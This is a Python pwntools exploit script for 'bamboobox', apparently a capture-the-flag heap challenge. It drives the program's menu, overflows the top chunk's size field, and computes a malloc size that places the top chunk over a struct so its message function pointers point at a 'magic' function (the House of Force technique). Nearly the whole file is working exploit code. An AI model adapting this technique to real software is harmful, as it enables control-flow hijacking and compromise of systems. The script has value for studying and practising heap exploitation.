#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.terminal = ['tmux', 'splitw', '-h']
context.encoding = 'utf-8'
# use libc-2.23.so
p = process('./bamboobox', env={"LD_PRELOAD":"./libc-2.23.so"})
# gdb.attach(p)
elf = ELF('./bamboobox')

def show():
    p.sendlineafter(':', '1')

def add(size, name):
    p.sendlineafter(':', '2')
    p.sendlineafter(':', str(size))
    p.sendlineafter(':', name)

def change(index, size, name):
    p.sendlineafter(':', '3')
    p.sendlineafter(':', str(index))
    p.sendlineafter(':', str(size))
    p.sendlineafter(':', name)

def remove(index):
    p.sendlineafter(':', '4')
    p.sendlineafter(':', str(index))

def leave():
    p.sendlineafter(':', '5')

magic = 0x400d49
add(0x30, 'a'*0x30) # chunk 0
pause()
# gdb.attach(p)

change(0, 0x40, b'a'* (0x30) + p64(0) + p64(0xffffffffffffffff)) # Overflow fields prev_size and size of current top chunk

### evil_size is the size to be passed to `malloc()``

# new_top = old_top + evil_size + 2*sizeof(long)
# evil_size + 2*sizeof(long) = new_top - old_top
# evil_size = new_top - old_top - 2*sizeof(long)
# evil_size = dest - 2*sizeof(long) - old_top - 2*sizeof(long)
# evil_size = dest - old_top - 4*sizeof(long)

dest = 0xd2f2a0 # &bamboo
old_top = 0xd2f300 - 0x10 # - 0x10 since we want the header of the top chunk
evil_size = dest - old_top - 4 * 8 # 0x2a0 - 0x300 - 0x10 - 4*8
print(evil_size)

add(evil_size, "aaaa")
add(0x10, p64(magic) * 2) # Cover bamboo->hello_message and bamboo->goodbye_message

leave()
p.interactive()
